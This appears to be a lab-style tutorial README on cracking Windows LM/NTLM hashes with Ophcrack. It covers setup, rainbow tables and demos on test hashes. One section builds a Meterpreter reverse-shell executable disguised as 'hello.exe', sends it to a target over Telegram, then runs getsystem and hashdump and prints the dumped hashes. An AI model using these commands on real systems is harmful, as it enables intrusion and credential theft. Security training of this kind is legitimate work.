# OPHCrack For Rainbow Attack

<img width="1050" height="600" alt="ophcrack" src="https://github.com/user-attachments/assets/d15b11bd-e1cf-4e1c-9e5a-b0962772ab6c" />


## What is Ophcrack?
Ophcrack is a free Windows password cracker that uses rainbow tables. It's particularly effective against LM and NTLM hashes from Windows systems.


## Key Features:
  - Rainbow Table Based - Precomputed hash chains for fast cracking
  - GUI and CLI Versions - User-friendly interface
  - Live CD Available - Bootable version for offline cracking
  - Free Tables - Multiple free rainbow tables available
  - Windows Focus - Specialized for Windows passwords


## How Rainbow Tables Work:
  - Precomputation: Hashes and passwords are precomputed in advance
  - Storage: Stored in optimized "rainbow tables"
  - Lookup: Fast password recovery through table lookups
  - Trade-off: Time-Memory tradeoff (faster than brute force)





# OPHCrack Methodology

- Official Website: https://ophcrack.sourceforge.io/

## INSTALLATION & SETUP

###  Installation on Kali Linux

#### Check In kali is already Have:
<img width="987" height="867" alt="image" src="https://github.com/user-attachments/assets/5b258d30-50e1-4008-a1bd-d1b6e0f17bc4" />


#### Install Ophcrack
````
sudo apt install ophcrack -y
````
<img width="737" height="225" alt="image" src="https://github.com/user-attachments/assets/ca87b60a-a53a-409a-af12-07b9b821cbbd" />


#### Install additional tools for hash extraction
````
sudo apt install samdump2 -y
````
<img width="757" height="206" alt="image" src="https://github.com/user-attachments/assets/86063f89-dcf0-4448-b0bf-d0e19d946604" />

#### 
````
ophcrack --help
````
<img width="736" height="693" alt="image" src="https://github.com/user-attachments/assets/60896a3a-dee7-4cbd-91eb-23c69f452dd9" />

---



### Options Usage:
| Option                  | Meaning                                                      |
| ----------------------- | ------------------------------------------------------------ |
| **-a**                  | Disable audit mode (default)                                 |
| **-A**                  | Enable audit mode                                            |
| **-b**                  | Disable brute-force                                          |
| **-B**                  | Enable brute-force (default)                                 |
| **-c `<config_file>`**  | Use a specific config file                                   |
| **-D**                  | Display detailed debugging information                       |
| **-d `<dir>`**          | Base directory of rainbow tables                             |
| **-e**                  | Do not show empty passwords                                  |
| **-f `<file>`**         | Load hashes from pwdump/session file                         |
| **-g**                  | Disable GUI (run in CLI mode)                                |
| **-h**                  | Show help information                                        |
| **-i**                  | Hide usernames                                               |
| **-I**                  | Show usernames (default)                                     |
| **-l `<file>`**         | Log all output to a file                                     |
| **-n `<num>`**          | Number of threads to use                                     |
| **-o `<file>`**         | Write cracking output (pwdump format)                        |
| **-p `<num>`**          | Preload tables (0 = none, 1 = index, 2 = index+end, 3 = all) |
| **-q**                  | Quiet mode (minimal output)                                  |
| **-r**                  | Auto-start cracking (GUI only)                               |
| **-s**                  | Disable session auto-saving                                  |
| **-S `<session_file>`** | Use session file to auto-save progress                       |
| **-t `<table list>`**   | Select tables to use (e.g., xp_free_fast,0,3:vista_free)     |
| **-u**                  | Show statistics after cracking                               |
| **-v**                  | Verbose output                                               |
| **-w `<dir>`**          | Load hashes directly from encrypted SAM directory            |
| **-x `<file>`**         | Export results to CSV                                        |


---


### Download Rainbow Tables
#### Create directory
````
mkdir -p ~/ophcrack_tables
cd ~/ophcrack_tables
````
<img width="413" height="144" alt="image" src="https://github.com/user-attachments/assets/b07620ee-6612-4c3d-9f10-459210b364eb" />


#### Download free tables
- Small
````
wget http://downloads.sourceforge.net/ophcrack/tables_xp_free_small.zip
````
<img width="971" height="358" alt="image" src="https://github.com/user-attachments/assets/f83a4603-7316-4717-acee-c8452df87baf" />

- Fast
````
wget http://downloads.sourceforge.net/ophcrack/tables_xp_free_fast.zip
````
<img width="1900" height="370" alt="image" src="https://github.com/user-attachments/assets/cfaf2903-1e40-4e4b-8557-5e52c319516b" />


- Check
````
ls
````
<img width="776" height="140" alt="image" src="https://github.com/user-attachments/assets/bfe8c715-9acc-430d-8d45-0884acdf5b3b" />


#### Extract tables
````
unzip tables_xp_free_small.zip
````
<img width="644" height="483" alt="image" src="https://github.com/user-attachments/assets/7e8b6222-4f5f-49cc-8d8a-7f4cc3e1d2b2" />

````
ls -la ~/ophcrack_tables/
````
<img width="984" height="625" alt="image" src="https://github.com/user-attachments/assets/eda74520-4a65-4240-af2a-6029675220c1" />

---



## RAINBOW TABLES EXPLAINED

### Available Tables:

- XP Free Tables:
  - XP free small: 3 tables, 308MB
  - XP free fast: 8 tables, 703MB  
  - XP free: 8 tables, 1.3GB
- Vista Tables:
  - Vista free: 8 tables, 461MB

- Custom Tables:
  - Can create your own with rtgen/rcrack


### Table Effectiveness:
  - XP Tables: Crack passwords up to 14 characters (LM hashes)
  - Vista Tables: Crack passwords up to 14 characters (NTLM hashes)
  - Success Rate: 99.9% for passwords in the table space



## LM Hash
  • 	The password is case insensitive and maximum 14 characters in length
  • 	All characters will be converted to upper case
  • 	In case the password’s length is less than 14 characters it will be padded with null characters, so its length becomes 14
  • 	These 14 characters will be split into 2 halves
  • 	Each half is converted to bits, and after every 7 bits, a parity bit (0) will be added, so the result would be a 64 bits key for each half. As a result, we will get two keys from the 2 pre-generated halves after adding these parity bits
  • 	Each of these keys is then used to encrypt a String using DES algorithm in ECB mode
  • 	The output of the two halves is then combined, and that makes out LM hash



---



## HASH EXTRACTION METHODS

### Extract Hashes from Live Windows
#### On windows
- In this i test with payloads:
````
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.127.128 LPORT=4444 -f exe -o hello.exe
````
<img width="907" height="162" alt="image" src="https://github.com/user-attachments/assets/f2e012af-77cf-43cf-986a-b7addb9f83ac" />

- Setup Listener
````
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.127.128
set LPORT 4444
exploit
````
<img width="655" height="304" alt="image" src="https://github.com/user-attachments/assets/6583f1bc-e3c9-4262-92f3-914b3feb1f6b" />


- In this i send to target by telegram:
<img width="891" height="560" alt="image" src="https://github.com/user-attachments/assets/2decec2d-33b8-4485-8209-7f79894d43d7" />

<img width="770" height="615" alt="image" src="https://github.com/user-attachments/assets/c1e91dbb-88de-4242-bd17-cd74d065a097" />

- In my windows
<img width="963" height="857" alt="image" src="https://github.com/user-attachments/assets/60e57fbd-c2dd-4fb9-adba-97235c4bb2b5" />

<img width="1022" height="712" alt="image" src="https://github.com/user-attachments/assets/03618e0e-5ec8-4767-9c2e-fd71f0585530" />

<img width="760" height="722" alt="image" src="https://github.com/user-attachments/assets/072b2e18-8d92-45dd-98b5-13373fae3c37" />

<img width="662" height="543" alt="image" src="https://github.com/user-attachments/assets/862a91c7-9737-4249-b734-ba171364955d" />

<img width="531" height="501" alt="image" src="https://github.com/user-attachments/assets/52cdaaff-b413-488f-9c12-8121da4490c5" />

<img width="456" height="347" alt="image" src="https://github.com/user-attachments/assets/c843de37-28e1-466b-be58-d904fe1a32f8" />


- After back to our kali `Terminal`:
<img width="911" height="362" alt="image" src="https://github.com/user-attachments/assets/9d99f980-4d4f-4059-93ee-9ddac9408a8c" />

- Now we got target `meterpreter`:
````
getsystem
hashdump
````
<img width="782" height="270" alt="image" src="https://github.com/user-attachments/assets/a3408d97-0394-48e9-8eb4-c0abcfe7c25a" />

- Right now we get Hash of target Password.
````
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mepol:1001:aad3b435b51404eeaad3b435b51404ee:5add2d9e50aa906144e6568de632b9be:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:642f4325541ae4bfb64852e5c1f44dbc:::
````


### Open OPHCrack
<img width="1037" height="852" alt="image" src="https://github.com/user-attachments/assets/faad868b-d23b-46cc-8dde-b7fe02a0dde2" />

<img width="800" height="635" alt="image" src="https://github.com/user-attachments/assets/b2e76f61-9f46-4330-a65a-d8406befef6e" />


#### Download XP Free small
- Firs go to official website: https://ophcrack.sourceforge.io/
<img width="785" height="652" alt="image" src="https://github.com/user-attachments/assets/59ab9541-224e-4acd-89d3-efa54f9047d9" />

<img width="392" height="653" alt="image" src="https://github.com/user-attachments/assets/e54fdd75-39d6-4836-9f53-6005f4a84cb2" />

<img width="1043" height="648" alt="image" src="https://github.com/user-attachments/assets/6166bfdf-4e54-4244-9d7a-143d9e668df6" />

- Or go to direct: https://sourceforge.net/projects/ophcrack/files/latest/download

- Also we can use command to downloads in linux.
- So in this i used omand to downloads:

````
mkdir table_xp_free_small
cd table_xp_free_small
wget http://downloads.sourceforge.net/ophcrack/tables_xp_free_small.zip
````

<img width="694" height="291" alt="image" src="https://github.com/user-attachments/assets/fd694cbd-0a53-4ae1-a5c8-a5443434bac7" />

<img width="1063" height="643" alt="image" src="https://github.com/user-attachments/assets/f0618901-6a7b-4250-9ab9-5714c7233317" />



````
unzip tables_xp_free_small.zip
````
<img width="612" height="349" alt="image" src="https://github.com/user-attachments/assets/0dfa76a4-73a9-46e3-97d7-e0191c29fce5" />




- Or we can install on ophcrack:
<img width="785" height="637" alt="image" src="https://github.com/user-attachments/assets/d411fbb8-4fa3-44d9-b89b-420a4d00fe54" />


<img width="730" height="528" alt="image" src="https://github.com/user-attachments/assets/477bec55-4b52-46c3-8e8e-3ccab1e1077a" />


<img width="1005" height="717" alt="image" src="https://github.com/user-attachments/assets/d5ba259c-2e18-47fb-b220-6f1ae57f9aa2" />


<img width="980" height="541" alt="image" src="https://github.com/user-attachments/assets/7c06da24-2fc7-4dea-80c1-db3c6e813bc8" />


<img width="675" height="465" alt="image" src="https://github.com/user-attachments/assets/9607d671-8fe3-4f37-829f-e817bf788f4d" />

- So we will see this:




- After go to our Terminal and copy the hash of windows:
<img width="821" height="317" alt="image" src="https://github.com/user-attachments/assets/f8b3f93a-ea19-4992-b418-8f8abfb30cbd" />

- Hash: `5add2d9e50aa906144e6568de632b9be`

<img width="792" height="652" alt="image" src="https://github.com/user-attachments/assets/3e2d5677-39fb-42fd-a5ce-d6ebfa3e8340" />


<img width="818" height="633" alt="image" src="https://github.com/user-attachments/assets/0573f9b4-5465-46b2-a163-d7125033643b" />

<img width="788" height="635" alt="image" src="https://github.com/user-attachments/assets/ab57c55f-02e6-412d-96dc-e29d517ecc8b" />

<img width="788" height="645" alt="image" src="https://github.com/user-attachments/assets/6f201e7e-d747-4a83-9c51-d3a9cabce248" />

<img width="795" height="633" alt="image" src="https://github.com/user-attachments/assets/451564d8-6083-43b1-8b8e-6c65ad287371" />

- Now it will crack:
<img width="805" height="634" alt="image" src="https://github.com/user-attachments/assets/9a32d010-b173-4825-8d92-95ba61cab29c" />

<img width="800" height="625" alt="image" src="https://github.com/user-attachments/assets/47ec033b-13e9-4985-8312-ddf79b600d1e" />

- So in this it mean `Ophcrack` can't find our windows password, but some windows it maybe cracked and show password.

 ---


### Crack LM/NTLM Hash
- First in this i go to this website: https://www.browserling.com/tools/ntlm-hash
for generate Hash:
<img width="677" height="512" alt="image" src="https://github.com/user-attachments/assets/373ac80d-9820-4833-adfd-429233da9c5c" />

<img width="791" height="653" alt="image" src="https://github.com/user-attachments/assets/72c33804-d451-42a2-9006-985eed2f6fe0" />

<img width="803" height="638" alt="image" src="https://github.com/user-attachments/assets/1a7c8be3-8dd0-4646-8cde-cbb88043ca22" />

<img width="800" height="631" alt="image" src="https://github.com/user-attachments/assets/decebfe7-ef29-4591-9f36-e999213136fa" />

- It now start crack our windows password Hash:
 <img width="799" height="623" alt="image" src="https://github.com/user-attachments/assets/9018b102-b81e-4d0d-b4d7-0869faadad4b" />

- This not found our password Hash.


#### Now i'm try others
- In this i generate new i test with this `abc`: 
<img width="710" height="610" alt="image" src="https://github.com/user-attachments/assets/e731e1bd-69c7-47c5-9cf0-e4c3da2be0db" />

<img width="615" height="595" alt="image" src="https://github.com/user-attachments/assets/f5b7b331-76a9-4918-a9a1-ef154f8e8c64" />

<img width="805" height="631" alt="image" src="https://github.com/user-attachments/assets/8fb68f9c-2ca7-436c-a698-78e3bd54a7d5" />

<img width="798" height="631" alt="image" src="https://github.com/user-attachments/assets/402b42ac-323b-44d3-8d4e-aae3255f4671" />

- Now we found the correct: `abc`



- Also in this i test with others Hash:
In this i generate this password: `pass`
<img width="807" height="632" alt="image" src="https://github.com/user-attachments/assets/6be89836-eb42-4e1c-9457-b11a9a065668" />

<img width="1919" height="697" alt="image" src="https://github.com/user-attachments/assets/dc9ad99e-d35f-430f-a89c-b434ac0203e7" />

- So in this we found the correct password Hash.

---


## Crack LM / NTLM
- In this i generate with `cyberchef`: https://gchq.github.io/CyberChef/#recipe=LM_Hash()&input=YWJj
<img width="804" height="632" alt="image" src="https://github.com/user-attachments/assets/b6f1aa8d-c542-42b7-859b-acd10b869ab6" />

- This i generate this.
- After i past it to our `Ophcrack`:
<img width="1921" height="707" alt="image" src="https://github.com/user-attachments/assets/f8f535ef-4b4a-4026-8fd3-4818146eb6e8" />

-  Like this after i generate NTLM:

<img width="477" height="267" alt="image" src="https://github.com/user-attachments/assets/3616ce80-b0ab-4ebc-863d-55704bc1f706" />

- In this we got this Hash:
<img width="802" height="633" alt="image" src="https://github.com/user-attachments/assets/7cffd225-b1ca-4345-8ee3-d9bc54d77214" />

- And past to our `Ophcrack`.
<img width="807" height="635" alt="image" src="https://github.com/user-attachments/assets/01524432-70df-472a-9815-767bafc00ad8" />

- We see this, after click on `Crack` like this: 
<img width="810" height="632" alt="image" src="https://github.com/user-attachments/assets/5cdc7186-39bd-41bb-8daa-2ce7567214ab" />

<img width="1918" height="701" alt="image" src="https://github.com/user-attachments/assets/63ef8f0c-3879-40c4-a8e9-d40fff59c2e9" />

- Now we got password Hash.



#### In this i generate others password:
- In cyberchecf:
<img width="807" height="630" alt="image" src="https://github.com/user-attachments/assets/e757f6aa-b6ba-4f68-8364-f520ded1dff0" />

- After past it to our `Ophcrack`:
<img width="1913" height="710" alt="image" src="https://github.com/user-attachments/assets/9efbd983-770a-4a28-94cd-eeb3c7d56936" />


- After i generate `NTLM` again:
<img width="481" height="267" alt="image" src="https://github.com/user-attachments/assets/28e93cfd-1e83-465a-9dc9-01f9a193548d" />

<img width="807" height="631" alt="image" src="https://github.com/user-attachments/assets/4e88bb84-27ef-4102-a19c-ecd79d012869" />


- And then past to our `Ophcrack` like above, after click `Ok`:

<img width="807" height="631" alt="image" src="https://github.com/user-attachments/assets/12e713a9-3e0a-45ad-88b1-738bb3ce54e6" />

- Now we got hash just click on `Crack`:

<img width="803" height="633" alt="image" src="https://github.com/user-attachments/assets/f24aaae0-a4e3-4ef4-a548-ed0a14a77118" />

- In this we found this correct password of our Hash.


---



## Crack LM
- In this i generate it in cyberchecf:
<img width="1918" height="707" alt="image" src="https://github.com/user-attachments/assets/32a1a0be-51b9-4a09-8216-ee3e4b40ef75" />

- Now we get Hash of password: `password`, and after copy it and past it to our `Ophcrack`
<img width="800" height="633" alt="image" src="https://github.com/user-attachments/assets/a4adb01c-419f-4563-b0f3-b438ceb7abee" />

- After `load` it to our `Ophcrack`, and click on `Crack`:

<img width="803" height="636" alt="image" src="https://github.com/user-attachments/assets/295205d1-cebe-4f15-aa08-4c48191a0aad" />

- So now we found the corect password Hash.

---


**
Note: 
- LM we input `:` next Hash like this: `E52CAC67419A9A224A3B108F3FA6CB6D:`
- NTLM we input `:` before Hash like this: `:E52CAC67419A9A224A3B108F3FA6CB6D`
- LM / NTLM we input `:` in the middle Hash: `E52CAC67419A9A224A3B108F3FA6CB6D:E52CAC67419A9A224A3B108F3FA6CB6D`
**



----


## End of OPHCrack for 

---


## Reference
1. Ophcrack official: https://ophcrack.sourceforge.io/


---

## Cradit: NIn Kanong (k4n0ng)

---
